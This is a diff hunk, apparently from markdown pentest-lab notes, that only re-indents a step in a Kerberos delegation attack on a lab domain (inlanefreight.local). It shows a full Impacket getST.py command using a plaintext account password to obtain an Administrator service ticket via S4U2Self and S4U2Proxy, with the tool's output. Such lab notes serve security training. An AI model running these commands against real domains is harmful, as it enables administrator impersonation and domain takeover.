@@ -41,18 +41,18 @@
 	
 - We can ask for a TGT for the created computer account, followed by a **S4U2Self** request to get a forwardable TGS ticket, and then a **S4U2Proxy** request to get a valid TGS ticket for a specific SPN on the targeted computer.
 
-	> getST.py -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.208.188 inlanefreigh
-	t.local/Jesta:Griffin1
-	Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs
+		> getST.py -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.208.188 inlanefreigh
+		t.local/Jesta:Griffin1
+		Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs
 
-	[-] CCache file is not found. Skipping...
-	[*] Getting TGT for user
-	[*] Impersonating Administrator
-	[*] Requesting S4U2self
-	[*] Requesting S4U2Proxy
-	[*] Saving ticket in Administrator@cifs_DC01.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache
-	
-	
+		[-] CCache file is not found. Skipping...
+		[*] Getting TGT for user
+		[*] Impersonating Administrator
+		[*] Requesting S4U2self
+		[*] Requesting S4U2Proxy
+		[*] Saving ticket in Administrator@cifs_DC01.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache
+		
+		
 - We then will use this TGS ticket by exporting the ticket's path to the KRB5CCNAME environment variable.
 
 
